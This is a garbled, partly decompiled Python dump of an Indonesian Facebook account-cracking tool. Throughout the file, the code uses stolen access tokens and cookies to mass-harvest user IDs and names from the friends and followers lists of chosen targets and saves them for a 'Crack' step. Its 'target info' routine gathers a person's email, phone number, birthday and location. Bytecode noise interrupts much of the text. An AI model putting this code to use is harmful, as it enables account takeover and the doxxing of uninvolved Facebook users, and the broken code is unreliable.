   t | d�S )Nr7   r   )Zhtmlr$   r$   r%   rZ  �  s    rZ  �����Mb`?c                 C   s0   | d D ]"}t j�|� t j��  t|� qd S )Nr   )r�   r   r�   r�   r   )ZkataZjumr-  r$   r$   r%   rH  �  s    
rH  c                  C   s*   t �d�j�� } d|  }t�d| � d S )NzDhttps://raw.githubusercontent.com/Dumai-991/App-Dumai991/main/no.txtzhttps://wa.me/z	am start )rP   rS   rU   rr   rm   r   )Zurl_waZapi_war$   r$   r%   r  �  s    r  c                   C   s
   t �  d S r�   )r  r$   r$   r$   r%   �Get_Ua�  s    rm  c                  C   sv  zt dd��� } W �n\ t�yp   t�d� t�d� d}d}d}t�  tt� d�� tt� d	�� tt	� d
�� tt	� d�t
 � ttd t
 d t d t
 d t d t d t d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � ttd t
 d t d t
 d � td�}|dk�sJ|dk�r~t�d� t dd�}|�|� |��  tt	d � n�|dk�s�|dk�r�t�d� t dd�}|�|� |��  tt	d � n�|dk�s�|dk�rt�d� t dd�}|�|� |��  tt	d � n^|dk�s"|dk�r^t�d� td �}t dd�}|�|� |��  tt	d � ntd!� t�  Y n0 d S )"Nr'   r(   r  r�   rQ  z�Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]zUser Agent BrokenzCreated By Riskyz,Silahkan Pilih User Agent Untuk DiGunakan !!z"Please Select A User Agent To Use
r   r�   r   z Made by Risky z( ZRecommendedz )r�   z Made by Dapuntar�   z Made by Anggar�   z Change User Agentz	Choose : r*   r�   zRun the Tools Again !!r�   r�   r�   zLogin Your User Agent User : zFailed to Choose)rN   rO   r�   rm   r   r�   r�   r	  r    r�   r#   r"   ra   r9   r�   r�   r	   r  )r�   Zua_risZua_angZua_dam�v�ppx�xxr$   r$   r%   r  �  sZ    

<$$$











r  c            *      C   s�	  zt dd��� } W n ty*   t�  Y n0 ttd t �}ttd t �}ttd t d t d t d t �}t	t
d	 � zt d
d��� } W nF ty�   ttd t d t d t d � t�d� t�  Y n0 z0t�d||| f �}t�|j�}|d d }W n   Y n0 z&t�|�}t�|j�}|d d }	W n   Y n0 z&t�|	�}
t�|
j�}|d d }W n   Y n0 z&t�|�}t�|j�}|d d }W n   Y n0 z&t�|�}t�|j�}|d d }W n   Y n0 z&t�|�}t�|j�}|d d }W n   Y n0 z�||	v �r*ntt
|	 d � |	|v �rFntt
| d � ||v �rbntt
| d � ||v �r~ntt
| d � ||v �r�ntt
| d � W n   Y n0 �zt�|�}t�|j�}g }|d �dd�}t |d�}|d D ]�}|�|d d |d  � |�|d d |d  d � t�g d��}t�g d��}tj�d||tt|t|�tf � tj��  t�d� �q�|� �  tdt! d  � tt"� ttd! t d t d" t d# � W nV t#tf�y(   tt!d  � tt"� ttd! t d t d$ t d# � t$�  Y n0 �zt�|	�}t�|j�}|d d } t |d%�}|d D ]�}!|�|!d d |!d  � |�|!d d |!d  d � t�g d��}t�g d��}tj�d||tt|t|�tf � tj��  t�d� �qb|� �  tdt! d  � tt"� ttd! t d t d" t d# � W nV t#tf�y�   tt!d  � tt"� ttd! t d t d$ t d# � t$�  Y n0 �zt�|�}"t�|"j�}#t |d%�}|#d D ]�}$|�|$d d |$d  � |�|$d d |$d  d � t�g d��}t�g d��}tj�d||tt|t|�tf � tj��  t�d� �q�|� �  tdt! d  � tt"� ttd! t d t d" t d# � W nV t#tf�y�   tt!d  � tt"� ttd! t d t d$ t d# � t$�  Y n0 �zt�|�}%t�|%j�}&t |d%�}|&d D ]�}'|�|'d d |'d  � |�|'d d |'d  d � t�g d��}t�g d��}tj�d||tt|t|�tf � tj��  t�d� �q|� �  tdt! d  � tt"� ttd! t d t d" t d# � W nV t#tf�yH   tt!d  � tt"� ttd! t d t d$ t d# � t$�  Y n0 �zt�|�}(t�|(j�})t |d%�}|#d D ]�}$|�|)d d |)d  � |�|)d d |)d  d � t�g d��}t�g d��}tj�d||tt|t|�tf � tj��  t�d� �qv|� �  tdt! d  � tt"� ttd! t d t d$ t d# � t$�  W nV t#tf�	y�   tt!d  � tt"� ttd! t d t d$ t d# � t$�  Y n0 d S )&Nz.skipr(   zID Masal : zName File : zLimit r�   zmax 5000z) : zSilahkan Tunggu Sebentar !!r�   r�   r   r   � Token Invalidr  zBhttps://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sZpaging�nextr   �.jsonr�   �_r�   rC   r�   �<=>r;   �z[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mr   ��%r   r   �#�$[%s%s%s]%sTotal ID Public : %s%s%s �����MbP?z-Berasil Dump ID Masal Dengan Secara Brutal !!zTekan Enter �continuer�   z
go to menu�a+)%rN   rO   r�   r  r9   r�   ra   r"   r#   r�   r�   r    rm   r   rs   rP   rS   r�   r�   rU   rP  r~   r�   r
   r   r�   r   r�   r   r�   r�   r   r�   r	  Zgarisr�   r�   )*r�   �idtZmmkZaswZpokr-  Zrek1Zpok1rp  Zrek2Zpok2�xxxZrek3Zpok3ZxxxxZrek4Zpok4ZxxxxxZrek5Zpok5ZxxxxxxZrek6ZppkmZmnhr�   �qq�ysZjuyr�   �mrZxfghZjhgZphfakeZbhaqZhailonteZasdZaasdZhailontejepangZasdxxZaasdaZhaianakrecoderZmmkaqr$   r$   r%   r  �  sT   ($












"
($

"
($

"
($

"
($

"
$
$r  c               	   C   s�   z�t �d� ttd t d � ttd t �} ttd t d � t| ��	� �
� }tdd��:}|D ]$}|�d	�}|�t|d
 |d � qdW d   � n1 s�0    Y  W n" ttfy�   ttd � Y n0 d S )Nzls HasilzMasukan Nama File Contoh : zHasil/CP-07-01-2021.txtzNama File : zHasil Get Ttl DiSimpan Di : �get_ttl.txt�d   rF  r  r   r   zFile Tidak Tersedia !!)rm   r   r    r�   ra   r9   r�   r	  rN   rO   r1  r   r�   rJ  �get_ttlr�   r�   r	   )r2  rL  rM  rN  r$   r$   r%   r�   �  s    

:r�   c           
   
   C   s�  d}zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z&t	�
d	|  d
 | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n ttf�y
   d}Y n0 z|d }W n ttf�y4   d}Y n0 ttd | | � t�d� ttd | |  � t�d� ttd | | � t�d� ttd | | � t�d� t dd�}	|	�| d | d | d � |	��  t�d� t�d� t| |�S )Nr   r�   r(   r�   r   r   rq  r  r  �?access_token=r'  r;   r�   �birthdayzName Facebook : ���Q��?zID Facebook   : zPassword      : zTanggal Lahir : r�  z+ar  r   r   r�   )rN   rO   r�   r    r"   r#   rm   r   rs   rP   rS   r�   r�   rU   r�   r�   r	   r�   r�   r   r�   r�   r�  )
r~  r]  ra   r�   �jok�opr�   r�   �ttllZgxr$   r$   r%   r�  �  sD    $





r�  c            "   
   C   s  d} zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z6t	t
d	 t �}t�d
| d | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n$ ttf�y"   td t }Y n0 z|d }W n$ ttf�yT   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }	W n$ ttf�y�   td t }	Y n0 z|d }
W n$ ttf�y�   td t }
Y n0 z|d }W n$ ttf�y   td t }Y n0 z|d }W n$ ttf�yN   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 zd|d d  }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y&   td t }Y n0 z|d }W n$ ttf�yX   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y    td t }Y n0 z|d }W n$ ttf�yR   td t }Y n0 z�t�d
| d  | �}g }t�|j�}|d d! �d"d#�}t |d$�}|d% D ]"} |�| d � |�| d � �q�|��  d&t|� }W nD t�y    td t }ttd' t d( t d t d) � Y n0 zbt�d*||f �}t�|j�}|d% D ]6}|d }|d }|�d"�d+ } |�|d, |  � �qJW n   Y n0 z.t�d-||f �}t�|j�}|d. d/ }!W n. ttf�y�   d0ttf }!Y n   Y n0 td1t d2 � t�d3� td1t d4 |  | � ttd5 |  | � ttd6 |  | � t�d3� ttd7 |  |
 � t�d3� ttd8 |  | � t�d3� td1t d9 � t�d3� td1t d: |  | � t�d3� ttd; |  | � t�d3� ttd< |  | � t�d3� ttd= | � t�d>� ttd?|!  � t�d3� ttd@||f  � t�d>� ttdA |  | � t�d3� ttdB |  | � t�d3� ttdC |  | � t�d3� ttdD |  | � t�d3� ttdE |  | � t�d3� t d1t dF � t	tdG � t!�  d S )HNr   r�   r(   r�   r   r   rq  r  zMasukkan ID Target :r  r�  r'  r;   u   —�
first_nameZ	last_namer�   r\  r�  �timezoneZrelationship_statusz	dengan %sZsignificant_other�locationZhometownZlinkZupdated_timeZmobile_phoner<   ZaboutZgenderz/friends?access_token=rs  r�   rt  r�   rC   z%sr   r   z Total Friend     : -z5https://graph.facebook.com/%s/friends?access_token=%sr   r  z9https://graph.facebook.com/%s/subscribers?access_token=%sZsummaryZtotal_countz%s-%sr   zInformasih Targwt !!g333333�?zFull Name       : zFirst Name      : zLast Name       : zUserName        : zTanggal Lahir   : zData Data Target !!zGmail Facebook  : zNomor Telepons  : zJenis Kelamin   : zJumlah Teman    : r�  zFollowers       : %szStatus Hubungan : %s %szLink Facebook   : zTentang Status  : zKota Asal       : zTinggal         : zTerahir DiUpdate: zAthour : Mr.RiskyzTekan Enter Untuk Kembali)"rN   rO   r�   r    r"   r#   rm   r   rs   r9   r�   rP   rS   r�   r�   rU   r�   r�   r	   r�   �Mr�   rP  r~   r�   r�   r   �rsplitr#  r�   r   r	  r�   r�   )"ra   r�   r~  r�  r�  r�   r�   ZnamadeZnamabeZidfb�userr�  ZtzimZstasZdgnZtiglZdariZlinsZuptdZnmrrZemaiZbiooZgndrr(   r�   r�   r�  r�  ZtemnZbmxZuidZnaZnmZpengikutr$   r$   r%   r  �  s   $

*"r  c              
   C   s�   zt dd��� }W nF tyX   ttd t d t d t d � t�d� t�  Y n0 zg }| �	dd	�}t
|�W S  ty� } z4ttd
 t d t d t d|  � W Y d }~n
d }~0 0 d S )Nr�   r(   r�   r   r   � Cookie/Token Invalidr  r�   rt  r   r�   )rN   rO   r�   r    r"   r#   rm   r   rs   rP  �
pilihcrackr�   r	   )�riskyr�   r�   Zqqxr�   r$   r$   r%   r
  h  s    $

r
  c                  C   s�   t �d� t�  tt� d�� tt� d�� tt� d��} | dv rJt�  n�| dksZ| dkrbt	�  n�| dksr| d	krzt
�  nn| d
ks�| dkr�t�  nV| dks�| dkr�t�  n>| dks�| dkr�t�  n&| dks�| dkr�t�  ntd� t�  d S )Nr�   �*Ketik ( menu ) Untuk Kembali KeMenu Utaman�'Silahkan Pilih Mau Dump ID !! [ 1 - 5 ]�	Jumlah : �r   r�   z  r*   r�   r�   r�   r�   r�   r�   r�   r�   r�   �MENUr�   �wrong)rm   r   r�   r    r�   r�   r9   r	  r  �
Follow__01�
Follow__02�
Follow__03�
Follow__04�Khususr�   �rn  r$   r$   r%   r  u  s*    
r  c                   C   s
   t �  d S r�   )r  r$   r$   r$   r%   �public�  s    r�  c                  C   s�   t �d� t�  tt� d�� tt� d�� tt� d��} | dv rJt�  n�| dksZ| dkrbt	�  n�| dksr| d	krzt
�  nt| d
ks�| dkr�t�  n\| dks�| dkr�ttd � n>| dks�| dkr�t�  n&| dks�| dkr�t�  ntd� t�  d S )Nr�   r�  r�  r�  r�  r*   r�   r�   r�   r�   r�   r�   r�   zCrack 4 ID Sedang Error !!r�   r�   r�  r�   r�  )rm   r   r�   r    r�   r�   r9   r	  r  �
Public__01�
Public__02�
Public__03r	   �
Public__05r�   r�  r$   r$   r%   r  �  s*    
r  c                  C   sX  z t dd��� } t dd��� }W n8 tyX   ttd � t�d� t�d� t	�  Y n0 t
td � ttd t d t d	 t d
 �}t|�dk r�t
|dv r�dntd � t�d� t�  q�t
td t d t d	 t d � ttd t d t d	 t d �}t|�dk �rbt
|dv �r&dntd � t�d� ttd t d t d	 t d �}�qzRt�d| d | �}t�|j�}ttd t d t d	 t d |d  � W n^ t�y   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 z�t�d||| f �}g }t�|j�}|d d �d d!�}	t |	d"�}
|d# D ]�}|�|d$ d% |d  � |
�|d$ d% |d  d& � t�g d'��}t�g d(��}tj�d)||tt|t|�tf � tj� �  t�d*� �q`|
�!�  t"|	�W S  t#�yR } z6t
td+ � t
td, � ttd- � t$�  W Y d }~n
d }~0 0 d S ).Nr�   r(   �Token Errorr  �{�G�z�?�Made by Risky And Dumai-991r   r   r   � Public ID Target 01 : �   r�   �	Kosong ??�Masukan 5 Angka !!r  � Recommended For 1500 Dump ID� Jumlah Dump Per-ID : r�   �Masukan 3 Angka !!r  r�  � Name : r;   r   � ID Not Found�
[ r�   � ]�>https://graph.facebook.com/%s/friends?limit=%s&access_token=%sr�  rs  r�   rt  r�   rC   r�   ru  r   rv  rw  rz  r{  �Maaf Masalah Tidak DiKetahui�Maaf Masalah Terhadap Id 01�Press Enter !!)%rN   rO   r�   r    r	  rm   r   r�   r   rs   r�   r�   r9   r"   r#   r   r�  rP   rS   r�   r�   rU   r�   r�  rP  r~   r�   r
   r   r�   r   r�   r�   r�   r�  r�   r�   )�	__cindy__r�   r~  �max_idr�  r�  r  r�   r�   r�  r�  re   r�   r�  r�   r$   r$   r%   r�  �  sb    

$
$$
(0$ 
"

r�  c                  C   s�  z t dd��� } t dd��� }W n8 tyX   ttd � t�d� t�d� t	�  Y n0 t
td � ttd t d t d	 t d
 �}t|�dk r�t
|dv r�dntd � t�d� t�  q�ttd t d t d	 t d �}t|�dk �rt
|dv �rdntd � t�d� t�  q�t
td t d t d	 t d � ttd t d t d	 t d �}t|�dk �r�t
|dv �r�dntd � t�d� ttd t d t d	 t d �}�qfzRt�d| d | �}t�|j�}ttd t d t d	 t d |d  � W n^ t�yp   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 �z0t�d||| f �}g }t�|j�}	|d d  �d!d"�}
t |
d#�}|	d$ D ]�}|�|d% d& |d  � |�|d% d& |d  d' � t�g d(��}t�g d)��}tj�d*||tt|t|�tf � tj� �  t�d+� �q�|�!�  �z�zRt�d| d | �}t�|j�}ttd t d t d	 t d |d  � W n^ t�y   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 z�t�d||| f �}g }t�|j�}	t |
d,�}|	d$ D ]�}|�|d% d& |d  � |�|d% d& |d  d' � t�g d(��}t�g d)��}tj�d*||tt|t|�tf � tj� �  t�d+� �qH|�!�  t"|
�W W W S  t#�y> } z6t
td- � t
td. � ttd/ � t$�  W Y d }~n
d }~0 0 W n^ t�y�   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 W nP t#�y� } z6t
td- � t
td. � ttd/ � t$�  W Y d }~n
d }~0 0 d S )0Nr�   r(   r�  r  r�  r�  r   r   r   r�  r�  r�   r�  r�  r  � Public ID Target 02 : r�  r�  r�   r�  r  r�  r�  r;   r   r�  r�  r�   r�  r�  r�  rs  r�   rt  r�   rC   r�   ru  r   rv  rw  rz  r{  r}  r�  r�  r�  )%rN   rO   r�   r    r	  rm   r   r�   r   rs   r�   r�   r9   r"   r#   r   r�  rP   rS   r�   r�   rU   r�   r�  rP  r~   r�   r
   r   r�   r   r�   r�   r�   r�  r�   r�   )r�  r�   r~  �idt2r�  r�  r�  r  r�   r�   r�  r�  re   r�   r�  r�   r$   r$   r%   r�  �  s�    

$
$
$$
(0$ 
"
0$ 
"
 $ r�  c                  C   s	  z t dd��� } t dd��� }W n8 tyX   ttd � t�d� t�d� t	�  Y n0 t
td � ttd t d t d	 t d
 �}t|�dk r�t
|dv r�dntd � t�d� ttd t d t d	 t d
 �}q�ttd t d t d	 t d �}t|�dk �r\t
|dv �r dntd � t�d� ttd t d t d	 t d �}�qttd t d t d	 t d �}t|�dk �r�t
|dv �r�dntd � t�d� ttd t d t d	 t d �}�q�t
td t d t d	 t d � ttd t d t d	 t d �}t|�dk �r|t
|dv �r@dntd � t�d� ttd t d t d	 t d �}�q"zRt�d| d | �}t�|j�}ttd t d t d	 t d |d  � W n^ t�y,   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 �z|t�d||| f �}g }	t�|j�}
|d  d! �d"d#�}t |d$�}|
d% D ]�}|	�|d& d' |d  � |�|d& d' |d  d( � t�g d)��}t�g d*��}tj�d+||tt|t|	�tf � tj��  t�d,� �q||� �  �z2zVt�d| d | �}t�|j�}td(t d t d t d	 t d |d  � W n^ t�y�   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 �z$t�d||| f �}g }	t�|j�}
t |d-�}|
d% D ]�}|	�|d& d' |d  � |�|d& d' |d  d( � t�g d)��}t�g d*��}tj�d+||tt|t|	�tf � tj��  t�d,� �q
|� �  �z�zVt�d| d | �}t�|j�}td(t d t d t d	 t d |d  � W n^ t�y\   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 z�t�d||| f �}g }	t�|j�}
t |d-�}|
d% D ]�}|	�|d& d' |d  � |�|d& d' |d  d( � t�g d)��}t�g d*��}tj�d+||tt|t|	�tf � tj��  t�d,� �q�|� �  t!|�W W W W W S  t"�y� } z6t
td. � t
td/ � ttd0 � t#�  W Y d }~n
d }~0 0 W n^ t�y�   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 W nP t"�yF } z6t
td. � t
td1 � ttd0 � t#�  W Y d }~n
d }~0 0 W n^ t�y�   ttd t d t d	 t d � ttd t d t d t � t�  Y n0 W nP t"�y� } z6t
td. � t
td2 � ttd0 � t#�  W Y d }~n
d }~0 0 d S )3Nr�   r(   r�  r  r�  r�  r   r   r   r�  r�  r�   r�  r�  r  r�  � Public ID Target 03 : r�  r�  r�   r�  r  r�  r�  r;   r   r�  r�  r�   r�  r�  r�  rs  r�   rt  r�   rC   r�   ru  r   rv  rw  rz  r{  r}  r�  �Maaf Masalah Terhadap Id 03r�  �Maaf Masalah Terhadap Id 02r�  �$rN   rO   r�   r    r	  rm   r   r�   r   rs   r�   r�   r9   r"   r#   r   rP   rS   r�   r�   rU   r�   r�  rP  r~   r�   r
   r   r�   r   r�   r�   r�   r�  r�   r�   )r�  r�   r~  r�  �idt3r�  r�  r�  r  r�   r�   r�  r�  re   r�   r�  r�   r$   r$   r%   r�  1  s�    

$
&$
($
($$
(0$ 
"
4$ 
"
4$ 
"
 $  $ r�  c                  C   s�  z t dd��� } t dd��� }W n8 tyX   ttd � t�d� t�d� t	�  Y n0 t
td � ttd t d t d	 t d
 �}t|�dk r�t
|dv r�dntd � t�d� ttd t d t d	 t d
 �}q�ttd t d t d	 t d �}t|�dk �r\t
|dv �r dntd � t�d� ttd t d t d	 t d �}�qttd t d t d	 t d �}t|�dk �r�t
|dv �r�dntd � t�d� ttd t d t d	 t d �}�q�ttd t d t d	 t d �}t|�dk �rXt
|dv �rdntd � t�d� ttd t d t d	 t d �}�q�ttd t d t d	 t d �}t|�dk �r�t
|dv �r�dntd � t�d� ttd t d t d	 t d �}�q|t
td t d t d	 t d � ttd t d t d	 t d �}t|�dk �rxt
|dv �r<dntd � t�d� ttd t d t d	 t d �}�qzRt�d| d | �}t�|j�}	ttd t d t d	 t d |	d  � W n^ t�y(   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 �
z>t�d!||| f �}
g }t�|
j�}|	d" d# �d$d%�}t |d&�}|d' D ]�}|�|d( d) |d  � |�|d( d) |d  d* � t�g d+��}t�g d,��}tj�d-||tt|t|�tf � tj��  t�d.� �qx|� �  �z�zVt�d| d | �}t�|j�}	td*t d t d t d	 t d |	d  � W n^ t�y�   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 �z�t�d!||| f �}
g }t�|
j�}t |d/�}|d' D ]�}|�|d( d) |d  � |�|d( d) |d  d* � t�g d+��}t�g d,��}tj�d-||tt|t|�tf � tj��  t�d.� �q|� �  �z�zVt�d| d | �}t�|j�}	td*t d t d t d	 t d |	d  � W n^ t�yX   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 �z�t�d!||| f �}
g }t�|
j�}t |d/�}|d' D ]�}|�|d( d) |d  � |�|d( d) |d  d* � t�g d+��}t�g d,��}tj�d-||tt|t|�tf � tj��  t�d.� �q�|� �  �zlzVt�d| d | �}t�|j�}	td*t d t d t d	 t d |	d  � W n^ t�y�   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 �z^t�d!||| f �}
g }t�|
j�}t |d/�}|d' D ]�}|�|d( d) |d  � |�|d( d) |d  d* � t�g d+��}t�g d,��}tj�d-||tt|t|�tf � tj��  t�d.� �	q"|� �  �z(zVt�d| d | �}t�|j�}	td*t d t d t d	 t d |	d  � W n^ t�
yt   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 �zt�d!||| f �}
g }t�|
j�}t |d/�}|d' D ]�}|�|d( d) |d  � |�|d( d) |d  d* � t�g d+��}t�g d,��}tj�d-||tt|t|�tf � tj��  t�d.� �
q�|� �  td*t d t d t d	 t d0t|�  � t!|�W W W W W W W W W S  t"�y� } z6t
td1 � t
td2 � ttd3 � t#�  W Y d }~n
d }~0 0 W n^ t�yD   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 W nP t"�y� } z6t
td1 � t
td4 � ttd3 � t#�  W Y d }~n
d }~0 0 W n^ t�y�   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 W nP t"�yN } z6t
td1 � t
td5 � ttd3 � t#�  W Y d }~n
d }~0 0 W n^ t�y�   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 W nP t"�y } z6t
td1 � t
td6 � ttd3 � t#�  W Y d }~n
d }~0 0 W n^ t�yf   ttd t d t d	 t d � ttd t d t d  t � t�  Y n0 W nP t"�y� } z6t
td1 � t
td7 � ttd3 � t#�  W Y d }~n
d }~0 0 d S )8Nr�   r(   r�  r  r�  r�  r   r   r   r�  r�  r�   r�  r�  r  r�  r�  z Public ID Target 04 : z Public ID Target 05 : r�  r�  r�   r�  r  r�  r�  r;   r   r�  r�  r�   r�  r�  r�  rs  r�   rt  r�   rC   r�   ru  r   rv  rw  rz  r{  r}  � Total ID : %sr�  �Maaf Masalah Terhadap Id 05r�  �Maaf Masalah Terhadap Id 04r�  r�  r�  r�  )r�  r�   r~  r�  r�  �idt4�idt5r�  r�  r�  r  r�   r�   r�  r�  re   r�   r�  r�   r$   r$   r%   r�  �  s�   

$
&$
($
($
($
($$
(0$ 
"
4$ 
"
4$ 
"
4$ 
"
4$ 
"
0 $  $  $  $ r�  c               
   C   s�  t td � ttd t d t d t d �} t| �dk rft | dv rJdntd	 � t�d
� t�  q0ttd t d t d t d �}t|�dk r�t | dv r�dntd	 � t�d
� t�  q�t td t d t d t d � ttd t d t d t d �}t|�dk �rbt | dv �r&dntd	 � t�d
� ttd t d t d t d �}�q�z<zRt	�
d|  d t �}t�|j�}ttd t d t d t d |d  � W n^ t�y   ttd t d t d t d � ttd t d t d t � t�  Y n0 t	�
d| d | d t �}t�|j�}|d d �dd�}t|d�}|d D ]>}	t�|	d  d! |	d  � |�|	d  d! |	d  d" � �qh|��  ttd t d t d t d#tt�  � �znzRt	�
d| d t �}t�|j�}ttd t d t d t d |d  � W n| t�y�   ttd t d t d t d � ttd t d t d t � t�  t	�
d| d | d t �}Y n0 t�|j�}t|d�}|d D ]>}	t�|	d  d! |	d  � |�|	d  d! |	d  d" � �q�|��  ttd t d t d t d#tt�  � t|�W W S  t�y� }
 z6t td$ � t td% � ttd& � t�  W Y d }
~
n
d }
~
0 0 W nP t�y� }
 z6t td$ � t td' � ttd& � t�  W Y d }
~
n
d }
~
0 0 d S )(Nr�  r   r   r   � Followers ID Target 01 : �   r�   r�  �Masukan 7 Angka !!r  � Followers ID Target 02 : r�  r�  r�   r  r�  r�  r;   r   r�  r�  r�   r�  �/subscribers?limit=r  r�  rs  r�   rt  r}  rC   r�   ru  r   r�  r�  r�  r�  r�  )r�   r�   r9   r"   r#   r   r�   r   r�  rP   rS   r�   r�   r�   rU   r    r�   r  rP  rN   r�   r~   r�   r�   r�  r�   r�   )r~  r�  r�  r�  r�  r(   r�   r�  r�  re   r�   r$   r$   r%   r�  v  s~    $
$
$$
(0$ 
",0$ $
", r�  c               
   C   s<  t td � ttd t d t d t d �} t| �dk rft | dv rJdntd	 � t�d
� t�  q0ttd t d t d t d �}t|�dk r�t |dv r�dntd	 � t�d
� t�  q�ttd t d t d t d �}t|�dk �rt |dv �rdntd	 � t�d
� t�  q�t td t d t d t d � ttd t d t d t d �}t|�dk �r�t |dv �r�dntd � t�d
� ttd t d t d t d �}�qfzt	dd��
� }W nl t�y>   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z�zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�y�   ttd t d t d t d � ttd t d t d t � t�  Y n0 t�d|  d  | d! | �}g }t�|j�}	|d" d# �d$d%�}
t	|
d&�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �qJ|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n| t�yd   ttd t d t d t d � ttd t d t d t � t�  t�d| d  | d! | �}Y n0 t�|j�}	t	|
d+�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �q�|��  �zpzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n| t�y�   ttd t d t d t d � ttd t d t d t � t�  t�d| d  | d! | �}Y n0 t�|j�}	t	|
d+�}|	d' D ]>}|�|d( d) |d  � |�|d( d) |d  d* � �q�|��  ttd t d t d t d,t|�  � t|
�W W W S  t�y� } z6t td- � t td. � ttd/ � t�  W Y d }~n
d }~0 0 W nP t�y� } z6t td- � t td0 � ttd/ � t�  W Y d }~n
d }~0 0 W nP t�y6 } z6t td- � t td1 � ttd/ � t�  W Y d }~n
d }~0 0 d S )2Nr�  r   r   r   r�  r�  r�   r�  r�  r  r�  � Followers ID Target 03 : r�  r�  r�   r�  r�   r(   r�   r   r�  � Cookie/Token Rusakr  r  r�  r�  r;   r�  r�  r�   r�  r�  r  r�  rs  r�   rt  r�   rC   r�   ru  r   r}  r�  r�  r�  r�  r�  r�  )r�   r�   r9   r"   r#   r   r�   r   r�  rN   rO   r�   r    rm   r   rs   rP   rS   r�   r�   rU   r�   r  rP  r~   r�   r�   r�  r�   r�   )r~  r�  r�  r�  r�   r�  r�  r(   r�   r�   r�  r�  re   r�   r$   r$   r%   r�  �  s�    $
$
$
$$
($$
0$ 
"0$ $
"0$ $
",  r�  c               
   C   s�
  t d� tt� d�� ttd t d t d t d �} t| �dk rpt | dv rTd	ntd
 � t�d� t	�  q:ttd t d t d t d �}t|�dk r�t |dv r�d	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r(t |dv �rd	ntd
 � t�d� t	�  q�ttd t d t d t d �}t|�dk �r�t |dv �rjd	ntd
 � t�d� t	�  �qLttd t d t d t d �}t|�dk �r�t |dv �r�d	ntd
 � t�d� t	�  �q�t td t d t d t d � ttd t d t d t d �}t|�dk �r�t |dv �rNd	ntd � t�d� ttd t d t d t d �}�q0zt
dd��� }W nl t�y   ttd t d t d t d � ttd t d t d t d � t�d� t�  Y n0 �z,zRt�d|  d | �}t�|j�}ttd t d t d t d |d  � W n^ t�y�   ttd t d t d t d � ttd  t d! t d" t � t�  Y n0 t�d|  d# | d$ | �}	g }
t�|	j�}|d% d& �d'd(�}t
|d)�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �q|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �q(|��  �zzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y�   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �q<|��  �z�zRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �qP|��  �zNzRt�d| d | �}t�|j�}ttd t d t d t d |d  � W n8 t�y&   ttd t d t d t d � Y n0 t�d| d# | d$ | �}	t�|	j�}t
|d.�}|d* D ]>}|
�|d+ d, |d  � |�|d+ d, |d  d- � �qd|��  ttd t d t d t d/t|
�  � t|�W W W W W S  t�	y8 } z6t td0 � t td1 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�	y� } z6t td0 � t td3 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�	y� } z6t td0 � t td4 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�
y4 } z6t td0 � t td5 � ttd2 � t�  W Y d }~n
d }~0 0 W nP t�
y� } z6t td0 � t td6 � ttd2 � t�  W Y d }~n
